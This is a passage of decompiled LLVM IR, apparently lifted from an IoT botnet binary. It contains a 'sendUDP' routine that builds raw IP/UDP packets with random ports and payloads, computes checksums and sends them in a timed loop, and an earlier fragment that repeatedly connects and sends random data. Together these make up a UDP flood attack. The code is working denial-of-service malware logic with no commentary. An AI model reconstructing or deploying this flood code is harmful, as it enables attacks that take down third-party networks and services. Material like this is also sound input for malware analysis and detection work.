  store i32 ptrtoint ([36 x i8*]* @global_var_23d6c.1172 to i32), i32* @r1, align 4
  store i32 144, i32* @r2, align 4
  %v0_fe48 = call i32 @memcpy()
  %v0_fe4c = call i32 @random()
  %tmp = icmp ult i32 %storemerge3, 50
  br i1 %tmp, label %dec_label_pc_feec, label %dec_label_pc_fe8c

dec_label_pc_fe8c:                                ; preds = %dec_label_pc_fe30
  %v2_fe5c = urem i32 %v0_fe4c, 36
  %v3_fe68 = mul nuw nsw i32 %v2_fe5c, 4
  %v2_fe74 = add i32 %v2_fe70, %v3_fe68
  %v1_fe78 = inttoptr i32 %v2_fe74 to i32*
  %v2_fe78 = load i32, i32* %v1_fe78, align 4
  %v5_fe9c = inttoptr i32 %v2_fe78 to i32*
  %v6_fe9c = call i32 @__libc_send(i32 %v0_fd88, i32* %v5_fe9c, i32 75, i32 0)
  %v4_feb0 = call i32 @__libc_connect(i32 %v0_fd88, %sockaddr* %v3_feb0, i32 16)
  %v2_feb8 = call i32 @time(i32* null)
  %v3_fec4 = load i32, i32* %stack_var_-208, align 4
  %v2_fec8 = add i32 %v3_fec4, %v2_fd98
  %v5_fed0 = icmp slt i32 %v2_feb8, %v2_fec8
  br i1 %v5_fed0, label %dec_label_pc_fee4, label %dec_label_pc_fed4

dec_label_pc_fed4:                                ; preds = %dec_label_pc_fe8c
  %v1_fed8 = call i32 @__GI_close(i32 %v0_fd88)
  %v1_fee0 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_fee4:                                ; preds = %dec_label_pc_fe8c
  br label %dec_label_pc_feec

dec_label_pc_feec:                                ; preds = %dec_label_pc_fe30, %dec_label_pc_fee4
  %stack_var_-24.0 = phi i32 [ %storemerge3, %dec_label_pc_fe30 ], [ 0, %dec_label_pc_fee4 ]
  %v1_fef0 = add i32 %stack_var_-24.0, 1
  br label %dec_label_pc_fe30

; uselistorder directives
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v2_fdb8, { 1, 0 }
  uselistorder i32 %v1_fdac, { 2, 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 2, 1, 0 }
  uselistorder label %dec_label_pc_feec, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_ff04 = load i32, i32* @r4, align 4
  %v6_ff04 = load i32, i32* @fp, align 4
  store i32 65292, i32* %stack_var_-4, align 4
  %v2_ff08 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ff08, i32* @fp, align 4
  %v2_ff0c = ptrtoint i32* %stack_var_-136 to i32
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-76, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_ff34 = icmp eq i32 %arg2, 0
  br i1 %v2_ff34, label %dec_label_pc_ff3c, label %dec_label_pc_ff5c

dec_label_pc_ff3c:                                ; preds = %entry
  %v0_ff3c = call i32 @rand_cmwc()
  %v3_ff44 = mul i32 %v0_ff3c, 65536
  store i32 %v3_ff44, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ff80

dec_label_pc_ff5c:                                ; preds = %entry
  %v3_ff64 = urem i32 %arg2, 65536
  store i32 %v3_ff64, i32* %r3.global-to-local, align 4
  %v1_ff6c = call i32 @__GI_htons(i32 %v3_ff64)
  br label %dec_label_pc_ff80

dec_label_pc_ff80:                                ; preds = %dec_label_pc_ff3c, %dec_label_pc_ff5c
  %v2_ff84 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_ff84, i32* %r3.global-to-local, align 4
  %v3_ff90 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-72)
  store i32 %v3_ff90, i32* %r3.global-to-local, align 4
  %v2_ff98 = icmp eq i32 %v3_ff90, 0
  br i1 %v2_ff98, label %dec_label_pc_ffa0, label %dec_label_pc_10540

dec_label_pc_ffa0:                                ; preds = %dec_label_pc_ff80
  %v2_ffa4 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_ffa4, i32* %r3.global-to-local, align 4
  store i32 8, i32* @r2, align 4
  %v2_ffb4 = bitcast i32* %stack_var_-68 to i8*
  %v3_ffb4 = call i32 @__GI_memset(i8* %v2_ffb4, i32 0)
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v7_ffc4 = icmp eq i32 %arg4, 32
  br i1 %v7_ffc4, label %dec_label_pc_ffcc, label %dec_label_pc_10104

dec_label_pc_ffcc:                                ; preds = %dec_label_pc_ffa0
  store i32 17, i32* @r2, align 4
  %v0_ffd8 = call i32 @socket()
  store i32 %v0_ffd8, i32* %r3.global-to-local, align 4
  %v2_ffe8 = icmp eq i32 %v0_ffd8, 0
  br i1 %v2_ffe8, label %dec_label_pc_fff0, label %dec_label_pc_10008

dec_label_pc_fff0:                                ; preds = %dec_label_pc_ffcc
  %v2_fff4 = load i32, i32* @global_var_2e45c.55, align 4
  store i32 %v2_fff4, i32* %r3.global-to-local, align 4
  %v3_10000 = call i32 @HackerPrint(i32 %v2_fff4, i32 ptrtoint ([27 x i8]* @global_var_23dfc.1175 to i32))
  br label %dec_label_pc_10540

dec_label_pc_10008:                               ; preds = %dec_label_pc_ffcc
  %v3_10008 = load i32, i32* %stack_var_0, align 4
  %v1_1000c = add i32 %v3_10008, 1
  store i32 %v1_1000c, i32* %r3.global-to-local, align 4
  %v1_10014 = call i32 @malloc(i32 %v1_1000c)
  store i32 %v1_10014, i32* %r3.global-to-local, align 4
  %v2_10024 = icmp eq i32 %v1_10014, 0
  br i1 %v2_10024, label %dec_label_pc_10540, label %dec_label_pc_1002c

dec_label_pc_1002c:                               ; preds = %dec_label_pc_10008
  %v3_1002c = load i32, i32* %stack_var_0, align 4
  %v1_10030 = add i32 %v3_1002c, 1
  store i32 %v1_10030, i32* %r3.global-to-local, align 4
  store i32 %v1_10030, i32* @r2, align 4
  %v2_10040 = inttoptr i32 %v1_10014 to i8*
  %v3_10040 = call i32 @__GI_memset(i8* %v2_10040, i32 0)
  %v2_1004c = call i32 @makeRandomStr(i32 %v1_10014, i32 %v3_1002c)
  %v2_10054 = call i32 @time(i32* null)
  %v2_10060 = add i32 %v2_10054, %arg3
  store i32 %v2_10060, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_10074 = ptrtoint i32* %stack_var_-76 to i32
  %v6_10094 = inttoptr i32 %v1_10014 to i32*
  br label %dec_label_pc_10070

dec_label_pc_10070:                               ; preds = %dec_label_pc_100f4, %dec_label_pc_100e8, %dec_label_pc_1002c
  %stack_var_-104.0 = phi i32 [ 0, %dec_label_pc_1002c ], [ 0, %dec_label_pc_100e8 ], [ %v1_100f8, %dec_label_pc_100f4 ]
  %v3_10070 = load i32, i32* %stack_var_0, align 4
  store i32 %v2_10074, i32* %stack_var_-136, align 4
  store i32 %v3_10070, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_10094 = call i32 @__libc_sendto(i32 %v0_ffd8, i32* %v6_10094, i32 %v3_10070, i32 0, i32 %v2_10074, i32 16)
  store i32 %stack_var_-104.0, i32* %r3.global-to-local, align 4
  %v9_100a0 = icmp eq i32 %stack_var_-104.0, %arg6
  br i1 %v9_100a0, label %dec_label_pc_100a8, label %dec_label_pc_100f4

dec_label_pc_100a8:                               ; preds = %dec_label_pc_10070
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_ff34, label %dec_label_pc_100b4, label %dec_label_pc_100d0

dec_label_pc_100b4:                               ; preds = %dec_label_pc_100a8
  %v0_100b4 = call i32 @rand_cmwc()
  %v3_100c0 = udiv i32 %v0_100b4, 256
  %v3_100c85 = urem i32 %v3_100c0, 256
  store i32 %v3_100c85, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100d0

dec_label_pc_100d0:                               ; preds = %dec_label_pc_100a8, %dec_label_pc_100b4
  %v2_100d4 = call i32 @time(i32* null)
  store i32 %v2_100d4, i32* %r2.global-to-local, align 4
  store i32 %v2_10060, i32* %r3.global-to-local, align 4
  %v8_100e4 = icmp sgt i32 %v2_100d4, %v2_10060
  br i1 %v8_100e4, label %dec_label_pc_10540, label %dec_label_pc_100e8

dec_label_pc_100e8:                               ; preds = %dec_label_pc_100d0
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10070

dec_label_pc_100f4:                               ; preds = %dec_label_pc_10070
  %v1_100f8 = add i32 %stack_var_-104.0, 1
  store i32 %v1_100f8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10070

dec_label_pc_10104:                               ; preds = %dec_label_pc_ffa0
  store i32 %v2_ff0c, i32* %r3.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v0_10118 = call i32 @socket()
  store i32 %v0_10118, i32* %r3.global-to-local, align 4
  %v2_10128 = icmp eq i32 %v0_10118, 0
  br i1 %v2_10128, label %dec_label_pc_10130, label %dec_label_pc_10148

dec_label_pc_10130:                               ; preds = %dec_label_pc_10104
  %v2_10134 = load i32, i32* @global_var_2e45c.55, align 4
  store i32 %v2_10134, i32* %r3.global-to-local, align 4
  %v3_10140 = call i32 @HackerPrint(i32 %v2_10134, i32 ptrtoint ([27 x i8]* @global_var_23dfc.1175 to i32))
  br label %dec_label_pc_1053c

dec_label_pc_10148:                               ; preds = %dec_label_pc_10104
  store i32 1, i32* %stack_var_-80, align 4
  %v2_10150 = ptrtoint i32* %stack_var_-80 to i32
  store i32 4, i32* %stack_var_-136, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_10150, i32* %r3.global-to-local, align 4
  %v6_1016c = call i32 @__GI_setsockopt(i32 %v0_10118, i32 0, i32 3, i32* nonnull %stack_var_-80, i32 4)
  store i32 %v6_1016c, i32* %r3.global-to-local, align 4
  %v1_10174 = icmp slt i32 %v6_1016c, 0
  br i1 %v1_10174, label %dec_label_pc_1017c, label %dec_label_pc_10194

dec_label_pc_1017c:                               ; preds = %dec_label_pc_10148
  %v2_10180 = load i32, i32* @global_var_2e45c.55, align 4
  store i32 %v2_10180, i32* %r3.global-to-local, align 4
  %v3_1018c = call i32 @HackerPrint(i32 %v2_10180, i32 ptrtoint ([33 x i8]* @global_var_23e18.1177 to i32))
  br label %dec_label_pc_1053c

dec_label_pc_10194:                               ; preds = %dec_label_pc_10148
  store i32 49, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_101a0

dec_label_pc_101a0:                               ; preds = %dec_label_pc_10194, %dec_label_pc_101a0
  %v1_101d824 = phi i32 [ 49, %dec_label_pc_10194 ], [ %v1_101d8, %dec_label_pc_101a0 ]
  %v2_101a4 = call i32 @time(i32* null)
  store i32 %v2_101a4, i32* %r3.global-to-local, align 4
  store i32 %v2_101a4, i32* @r4, align 4
  %v0_101b0 = call i32 @rand_cmwc()
  %v0_101b8 = load i32, i32* @r4, align 4
  %v2_101b8 = xor i32 %v0_101b8, %v0_101b0
  store i32 %v2_101b8, i32* %r3.global-to-local, align 4
  %v1_101c0 = call i32 @srand(i32 %v2_101b8)
  %v0_101c4 = call i32 @random()
  store i32 %v0_101c4, i32* %r3.global-to-local, align 4
  %v1_101d0 = call i32 @init_rand(i32 %v0_101c4)
  %v1_101d8 = add nsw i32 %v1_101d824, -1
  store i32 %v1_101d8, i32* %r3.global-to-local, align 4
  %v3_101e4 = icmp eq i32 %v1_101d824, 0
  br i1 %v3_101e4, label %dec_label_pc_101ec, label %dec_label_pc_101a0

dec_label_pc_101ec:                               ; preds = %dec_label_pc_101a0
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v2_101f0 = icmp eq i32 %arg4, 0
  br i1 %v2_101f0, label %dec_label_pc_1021c, label %dec_label_pc_10204

dec_label_pc_10204:                               ; preds = %dec_label_pc_101ec
  %v1_10208 = sub i32 32, %arg4
  store i32 %v1_10208, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_10214 = shl i32 -1, %v1_10208
  br label %dec_label_pc_1021c

dec_label_pc_1021c:                               ; preds = %dec_label_pc_101ec, %dec_label_pc_10204
  %storemerge12 = phi i32 [ %v1_10214, %dec_label_pc_10204 ], [ 0, %dec_label_pc_101ec ]
  %v3_1021c = load i32, i32* %stack_var_0, align 4
  %v1_10220 = add i32 %v3_1021c, 28
  %v1_10230 = add i32 %v3_1021c, 34
  %v3_10234 = and i32 %v1_10230, -4
  %v1_1023c = load i32, i32* @sp, align 4
  %v2_1023c = sub i32 %v1_1023c, %v3_10234
  %v1_10240 = add i32 %v2_1023c, 8
  store i32 %v1_10240, i32* %r2.global-to-local, align 4
  %v1_1024c = add i32 %v2_1023c, 11
  %v3_10250 = and i32 %v1_1024c, -4
  %v1_10270 = add i32 %v3_10250, 20
  store i32 %v1_10270, i32* %r3.global-to-local, align 4
  %v5_10274 = inttoptr i32 %v1_10270 to i8*
  %v3_10278 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_10278, i32* @r4, align 4
  %v1_10280 = call i32 @HackerScan2(i32 %storemerge12)
  store i32 %v1_10280, i32* %r3.global-to-local, align 4
  store i32 %v1_10280, i32* @r0, align 4
  %v1_1028c = call i32 @__GI_htonl(i32 %v1_10280)
  store i32 %v1_1028c, i32* %r2.global-to-local, align 4
  %v3_10294 = load i32, i32* %stack_var_0, align 4
  %v1_10298 = add i32 %v3_10294, 8
  %v1_1029c = load i32, i32* @sp, align 4
  %v2_1029c = inttoptr i32 %v1_1029c to i32*
  store i32 %v1_10298, i32* %v2_1029c, align 4
  %v0_102a4 = load i32, i32* @r4, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v4_102ac = inttoptr i32 %v3_10250 to i8*
  %v5_102ac = call i32 @makeIPPacket(i8* %v4_102ac, i32 %v0_102a4, i32 %v1_1028c, i32 17)
  %v3_102b0 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_102b0, 8
  %v3_102c4 = urem i32 %fold, 65536
  store i32 %v3_102c4, i32* %r3.global-to-local, align 4
  %v1_102cc = call i32 @__GI_htons(i32 %v3_102c4)
  %sext = mul i32 %v1_102cc, 16777216
  %v1_102d0 = sdiv i32 %sext, 16777216
  store i32 %v1_102d0, i32* %r3.global-to-local, align 4
  store i32 %v1_10270, i32* %r2.global-to-local, align 4
  %v1_102d8 = trunc i32 %v1_102d0 to i8
  %v3_102d8 = add i32 %v3_10250, 24
  %v4_102d8 = inttoptr i32 %v3_102d8 to i8*
  store i8 %v1_102d8, i8* %v4_102d8, align 4
  %v0_102dc = load i32, i32* %r3.global-to-local, align 4
  %v3_102dc = sdiv i32 %v0_102dc, 256
  store i32 %v3_102dc, i32* %r3.global-to-local, align 4
  %v1_102e0 = trunc i32 %v3_102dc to i8
  %v2_102e0 = load i32, i32* %r2.global-to-local, align 4
  %v3_102e0 = add i32 %v2_102e0, 5
  %v4_102e0 = inttoptr i32 %v3_102e0 to i8*
  store i8 %v1_102e0, i8* %v4_102e0, align 1
  %v0_102e4 = call i32 @rand_cmwc()
  %v3_102f0 = urem i32 %v0_102e4, 65536
  store i32 %v3_102f0, i32* %r3.global-to-local, align 4
  store i32 %v1_10270, i32* %r2.global-to-local, align 4
  %v1_102f8 = trunc i32 %v0_102e4 to i8
  store i8 %v1_102f8, i8* %v5_10274, align 4
  %v0_102fc = load i32, i32* %r3.global-to-local, align 4
  %v3_102fc32 = udiv i32 %v0_102fc, 256
  %v1_10300 = trunc i32 %v3_102fc32 to i8
  %v2_10300 = load i32, i32* %r2.global-to-local, align 4
  %v3_10300 = add i32 %v2_10300, 1
  %v4_10300 = inttoptr i32 %v3_10300 to i8*
  store i8 %v1_10300, i8* %v4_10300, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_ff34, label %dec_label_pc_10310, label %dec_label_pc_10328

dec_label_pc_10310:                               ; preds = %dec_label_pc_1021c
  %v0_10310 = call i32 @rand_cmwc()
  %v3_10318 = mul i32 %v0_10310, 65536
  store i32 %v3_10318, i32* %r3.global-to-local, align 4
  %extract.t = trunc i32 %v0_10310 to i8
  br label %dec_label_pc_10344

dec_label_pc_10328:                               ; preds = %dec_label_pc_1021c
  %v3_10330 = urem i32 %arg2, 65536
  store i32 %v3_10330, i32* %r3.global-to-local, align 4
  %v1_10338 = call i32 @__GI_htons(i32 %v3_10330)
  %extract.t89 = trunc i32 %v1_10338 to i8
  br label %dec_label_pc_10344

dec_label_pc_10344:                               ; preds = %dec_label_pc_10310, %dec_label_pc_10328
  %v0_10310.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_10310 ], [ %extract.t89, %dec_label_pc_10328 ]
  %v3_10450.pre-phi = phi i32 [ 0, %dec_label_pc_10310 ], [ %v3_10330, %dec_label_pc_10328 ]
  store i32 %v1_10270, i32* %r2.global-to-local, align 4
  %v4_10348 = sext i8 %v0_10310.sink.off0 to i32
  %v3_1034c = add i32 %v3_10250, 22
  %v4_1034c = inttoptr i32 %v3_1034c to i8*
  store i8 %v0_10310.sink.off0, i8* %v4_1034c, align 2
  %v3_1035436 = udiv i32 %v4_10348, 256
  %v1_10358 = trunc i32 %v3_1035436 to i8
  %v2_10358 = load i32, i32* %r2.global-to-local, align 4
  %v3_10358 = add i32 %v2_10358, 3
  %v4_10358 = inttoptr i32 %v3_10358 to i8*
  store i8 %v1_10358, i8* %v4_10358, align 1
  store i32 %v1_10270, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_10364 = add i32 %v3_10250, 26
  %v4_10364 = inttoptr i32 %v3_10364 to i8*
  store i8 0, i8* %v4_10364, align 2
  %v0_10368 = load i32, i32* %r3.global-to-local, align 4
  %v1_10368 = trunc i32 %v0_10368 to i8
  %v2_10368 = load i32, i32* %r2.global-to-local, align 4
  %v3_10368 = add i32 %v2_10368, 7
  %v4_10368 = inttoptr i32 %v3_10368 to i8*
  store i8 %v1_10368, i8* %v4_10368, align 1
  %v1_10370 = add i32 %v3_10250, 28
  store i32 %v1_10370, i32* %r3.global-to-local, align 4
  %v3_10378 = load i32, i32* %stack_var_0, align 4
  %v2_1037c = call i32 @makeRandomStr(i32 %v1_10370, i32 %v3_10378)
  %v1_1038c = or i32 %v3_10250, 2
  store i32 %v1_1038c, i32* %r3.global-to-local, align 4
  %v1_10390 = inttoptr i32 %v1_1038c to i8*
  %v2_10390 = load i8, i8* %v1_10390, align 2
  %v3_10390 = zext i8 %v2_10390 to i32
  store i32 %v3_10390, i32* %r2.global-to-local, align 4
  %v1_10394 = or i32 %v1_1024c, 3
  %v2_10394 = inttoptr i32 %v1_10394 to i8*
  %v3_10394 = load i8, i8* %v2_10394, align 1
  %v4_10394 = zext i8 %v3_10394 to i32
  %v4_10398 = mul nuw nsw i32 %v4_10394, 256
  %v5_10398 = or i32 %v4_10398, %v3_10390
  store i32 %v5_10398, i32* %r3.global-to-local, align 4
  %v3_103a4 = call i32 @csum(i8* %v4_102ac, i32 %v5_10398)
  %sext6 = mul i32 %v3_103a4, 16777216
  %v1_103a8 = sdiv i32 %sext6, 16777216
  store i32 %v1_103a8, i32* %r3.global-to-local, align 4
  store i32 %v3_10250, i32* %r2.global-to-local, align 4
  %v1_103b0 = trunc i32 %v1_103a8 to i8
  %v3_103b0 = add i32 %v3_10250, 10
  %v4_103b0 = inttoptr i32 %v3_103b0 to i8*
  store i8 %v1_103b0, i8* %v4_103b0, align 2
  %v0_103b4 = load i32, i32* %r3.global-to-local, align 4
  %v3_103b4 = sdiv i32 %v0_103b4, 256
  store i32 %v3_103b4, i32* %r3.global-to-local, align 4
  %v1_103b8 = trunc i32 %v3_103b4 to i8
  %v2_103b8 = load i32, i32* %r2.global-to-local, align 4
  %v3_103b8 = add i32 %v2_103b8, 11
  %v4_103b8 = inttoptr i32 %v3_103b8 to i8*
  store i8 %v1_103b8, i8* %v4_103b8, align 1
  %v2_103c0 = call i32 @time(i32* null)
  %v2_103cc = add i32 %v2_103c0, %arg3
  store i32 %v2_103cc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_103e0 = ptrtoint i32* %stack_var_-76 to i32
  %v3_10490 = add i32 %v3_10250, 4
  %v4_10490 = inttoptr i32 %v3_10490 to i8*
  %v2_104b8 = add i32 %v3_10250, 12
  %v3_104b8 = inttoptr i32 %v2_104b8 to i32*
  br label %dec_label_pc_103dc

dec_label_pc_103dc:                               ; preds = %dec_label_pc_1052c, %dec_label_pc_10520, %dec_label_pc_10344
  %stack_var_-100.0 = phi i32 [ 0, %dec_label_pc_10344 ], [ 0, %dec_label_pc_10520 ], [ %v1_10530, %dec_label_pc_1052c ]
  store i32 %v3_10250, i32* %r2.global-to-local, align 4
  %v1_103e4 = load i32, i32* @sp, align 4
  %v2_103e4 = inttoptr i32 %v1_103e4 to i32*
  store i32 %v2_103e0, i32* %v2_103e4, align 4
  %v1_103ec = load i32, i32* @sp, align 4
  %v2_103ec = add i32 %v1_103ec, 4
  %v3_103ec = inttoptr i32 %v2_103ec to i32*
  store i32 16, i32* %v3_103ec, align 4
  %v0_103f4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_10220, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_10400 = inttoptr i32 %v0_103f4 to i32*
  %v7_10400 = call i32 @__libc_sendto(i32 %v0_10118, i32* %v6_10400, i32 %v1_10220, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_10404 = call i32 @rand_cmwc()
  %v3_10410 = urem i32 %v0_10404, 65536
  store i32 %v3_10410, i32* %r3.global-to-local, align 4
  store i32 %v1_10270, i32* %r2.global-to-local, align 4
  %v1_10418 = trunc i32 %v0_10404 to i8
  store i8 %v1_10418, i8* %v5_10274, align 4
  %v0_1041c = load i32, i32* %r3.global-to-local, align 4
  %v3_1041c37 = udiv i32 %v0_1041c, 256
  %v1_10420 = trunc i32 %v3_1041c37 to i8
  %v2_10420 = load i32, i32* %r2.global-to-local, align 4
  %v3_10420 = add i32 %v2_10420, 1
  %v4_10420 = inttoptr i32 %v3_10420 to i8*
  store i8 %v1_10420, i8* %v4_10420, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_ff34, label %dec_label_pc_10430, label %dec_label_pc_10448

dec_label_pc_10430:                               ; preds = %dec_label_pc_103dc
  %v0_10430 = call i32 @rand_cmwc()
  %v3_10438 = mul i32 %v0_10430, 65536
  store i32 %v3_10438, i32* %r3.global-to-local, align 4
  %extract.t90 = trunc i32 %v0_10430 to i8
  br label %dec_label_pc_10464

dec_label_pc_10448:                               ; preds = %dec_label_pc_103dc
  store i32 %v3_10450.pre-phi, i32* %r3.global-to-local, align 4
  %v1_10458 = call i32 @__GI_htons(i32 %v3_10450.pre-phi)
  %extract.t91 = trunc i32 %v1_10458 to i8
  br label %dec_label_pc_10464

dec_label_pc_10464:                               ; preds = %dec_label_pc_10430, %dec_label_pc_10448
  %v0_10430.sink.off0 = phi i8 [ %extract.t90, %dec_label_pc_10430 ], [ %extract.t91, %dec_label_pc_10448 ]
  store i32 %v1_10270, i32* %r2.global-to-local, align 4
  %v4_10468 = sext i8 %v0_10430.sink.off0 to i32
  store i8 %v0_10430.sink.off0, i8* %v4_1034c, align 2
  %v3_10474 = sdiv i32 %v4_10468, 256
  store i32 %v3_10474, i32* %r3.global-to-local, align 4
  %v1_10478 = trunc i32 %v3_10474 to i8
  %v2_10478 = load i32, i32* %r2.global-to-local, align 4
  %v3_10478 = add i32 %v2_10478, 3
  %v4_10478 = inttoptr i32 %v3_10478 to i8*
  store i8 %v1_10478, i8* %v4_10478, align 1
  %v0_1047c = call i32 @rand_cmwc()
  %v3_10488 = urem i32 %v0_1047c, 65536
  store i32 %v3_10488, i32* %r3.global-to-local, align 4
  store i32 %v3_10250, i32* %r2.global-to-local, align 4
  %v1_10490 = trunc i32 %v0_1047c to i8
  store i8 %v1_10490, i8* %v4_10490, align 4
  %v0_10494 = load i32, i32* %r3.global-to-local, align 4
  %v3_10494 = sdiv i32 %v0_10494, 256
  store i32 %v3_10494, i32* %r3.global-to-local, align 4
  %v1_10498 = trunc i32 %v3_10494 to i8
  %v2_10498 = load i32, i32* %r2.global-to-local, align 4
  %v3_10498 = add i32 %v2_10498, 5
  %v4_10498 = inttoptr i32 %v3_10498 to i8*
  store i8 %v1_10498, i8* %v4_10498, align 1
  %v1_104a0 = call i32 @HackerScan2(i32 %storemerge12)
  store i32 %v1_104a0, i32* %r3.global-to-local, align 4
  store i32 %v1_104a0, i32* @r0, align 4
  %v1_104ac = call i32 @__GI_htonl(i32 %v1_104a0)
  store i32 %v1_104ac, i32* %r2.global-to-local, align 4
  store i32 %v1_104ac, i32* %v3_104b8, align 4
  store i32 %v1_1038c, i32* %r3.global-to-local, align 4
  %v2_104cc = load i8, i8* %v1_10390, align 2
  %v3_104cc = zext i8 %v2_104cc to i32
  store i32 %v3_104cc, i32* %r2.global-to-local, align 4
  %v3_104d0 = load i8, i8* %v2_10394, align 1
  %v4_104d0 = zext i8 %v3_104d0 to i32
  %v4_104d4 = mul nuw nsw i32 %v4_104d0, 256
  %v5_104d4 = or i32 %v4_104d4, %v3_104cc
  store i32 %v5_104d4, i32* %r3.global-to-local, align 4
  %v3_104e0 = call i32 @csum(i8* %v4_102ac, i32 %v5_104d4)
  %sext7 = mul i32 %v3_104e0, 16777216
  %v1_104e4 = sdiv i32 %sext7, 16777216
  store i32 %v1_104e4, i32* %r3.global-to-local, align 4
  store i32 %v3_10250, i32* %r2.global-to-local, align 4
  %v1_104ec = trunc i32 %v1_104e4 to i8
  store i8 %v1_104ec, i8* %v4_103b0, align 2
  %v0_104f0 = load i32, i32* %r3.global-to-local, align 4
  %v3_104f041 = udiv i32 %v0_104f0, 256
  %v1_104f4 = trunc i32 %v3_104f041 to i8
  %v2_104f4 = load i32, i32* %r2.global-to-local, align 4
  %v3_104f4 = add i32 %v2_104f4, 11
  %v4_104f4 = inttoptr i32 %v3_104f4 to i8*
  store i8 %v1_104f4, i8* %v4_104f4, align 1
  store i32 %stack_var_-100.0, i32* %r2.global-to-local, align 4
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v9_10500 = icmp eq i32 %stack_var_-100.0, %arg6
  br i1 %v9_10500, label %dec_label_pc_10508, label %dec_label_pc_1052c

dec_label_pc_10508:                               ; preds = %dec_label_pc_10464
  %v2_1050c = call i32 @time(i32* null)
  store i32 %v2_1050c, i32* %r2.global-to-local, align 4
  store i32 %v2_103cc, i32* %r3.global-to-local, align 4
  %v8_1051c = icmp sgt i32 %v2_1050c, %v2_103cc
  br i1 %v8_1051c, label %dec_label_pc_1053c, label %dec_label_pc_10520

dec_label_pc_10520:                               ; preds = %dec_label_pc_10508
  br label %dec_label_pc_103dc

dec_label_pc_1052c:                               ; preds = %dec_label_pc_10464
  %v1_10530 = add i32 %stack_var_-100.0, 1
  store i32 %v1_10530, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_103dc

dec_label_pc_1053c:                               ; preds = %dec_label_pc_10508, %dec_label_pc_1017c, %dec_label_pc_10130
  %v12_1054429 = phi i32 [ %v3_1018c, %dec_label_pc_1017c ], [ %v3_10140, %dec_label_pc_10130 ], [ %v2_1050c, %dec_label_pc_10508 ]
  br label %dec_label_pc_10540

dec_label_pc_10540:                               ; preds = %dec_label_pc_100d0, %dec_label_pc_ff80, %dec_label_pc_10008, %dec_label_pc_fff0, %dec_label_pc_1053c
  %v12_10544 = phi i32 [ %v3_ff90, %dec_label_pc_ff80 ], [ 0, %dec_label_pc_10008 ], [ %v3_10000, %dec_label_pc_fff0 ], [ %v12_1054429, %dec_label_pc_1053c ], [ %v2_100d4, %dec_label_pc_100d0 ]
  store i32 %v3_ff04, i32* @r4, align 4
  store i32 %v6_ff04, i32* @fp, align 4
  ret i32 %v12_10544

; uselistorder directives
  uselistorder i32 %v1_10530, { 1, 0 }
  uselistorder i32 %v1_104e4, { 1, 0 }
  uselistorder i32 %v3_10494, { 1, 0 }
  uselistorder i32 %v0_1047c, { 1, 0 }
  uselistorder i32 %v3_10474, { 1, 0 }
  uselistorder i8 %v0_10430.sink.off0, { 1, 0 }
  uselistorder i32 %v0_10430, { 1, 0 }
  uselistorder i32 %v0_10404, { 1, 0 }
  uselistorder i32 %stack_var_-100.0, { 0, 2, 1 }
  uselistorder i32 %v2_103cc, { 1, 0, 2 }
  uselistorder i32 %v3_103b4, { 1, 0 }
  uselistorder i32 %v1_103a8, { 1, 0 }
  uselistorder i32 %v1_1038c, { 0, 2, 1 }
  uselistorder i32 %v3_10450.pre-phi, { 1, 0 }
  uselistorder i8 %v0_10310.sink.off0, { 1, 0 }
  uselistorder i32 %v3_10330, { 2, 1, 0 }
  uselistorder i32 %v0_10310, { 1, 0 }
  uselistorder i32 %v0_102e4, { 1, 0 }
  uselistorder i32 %v3_102dc, { 1, 0 }
  uselistorder i32 %v1_102d0, { 1, 0 }
